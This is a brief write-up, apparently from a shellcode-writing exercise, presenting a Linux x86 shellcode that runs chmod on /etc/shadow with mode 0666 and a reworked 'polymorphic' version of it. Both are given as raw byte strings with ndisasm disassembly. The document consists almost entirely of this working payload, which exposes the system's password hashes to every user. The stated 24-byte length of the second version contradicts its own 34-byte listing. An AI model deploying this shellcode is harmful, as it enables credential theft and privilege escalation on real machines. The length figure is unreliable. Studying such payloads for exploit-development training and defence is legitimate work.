## Initial nasm code

Original shellcode: [Link](http://shell-storm.org/shellcode/files/shellcode-566.php)

Length: 27 bytes

Obtain from running: 

    echo -ne "\xb0\x0f\x99\x52\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01\xcd\x80" | ndisasm -u -

    ; chmod("//etc/shadow", 0666);
    00000000  B00F              mov al,0xf
    00000002  99                cdq
    00000003  52                push edx
    00000004  6861646F77        push dword 0x776f6461
    00000009  68632F7368        push dword 0x68732f63
    0000000E  682F2F6574        push dword 0x74652f2f
    00000013  89E3              mov ebx,esp
    00000015  66B9B601          mov cx,0x1b6
    00000019  CD80              int 0x80


    
  
 ## Polymorphic shellcode

Length: 24 bytes  

Obtain from running: 

    echo -ne "\x6a\x0f\x58\x51\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -

    00000000  6A0F              push byte +0xf
    00000002  58                pop eax
    00000003  51                push ecx
    00000004  6861646F77        push dword 0x776f6461
    00000009  68632F7368        push dword 0x68732f63
    0000000E  682F2F6574        push dword 0x74652f2f
    00000013  89E3              mov ebx,esp
    00000015  68B6010000        push dword 0x1b6
    0000001A  59                pop ecx
    0000001B  CD80              int 0x80
    0000001D  6A01              push byte +0x1
    0000001F  58                pop eax
    00000020  CD80              int 0x80
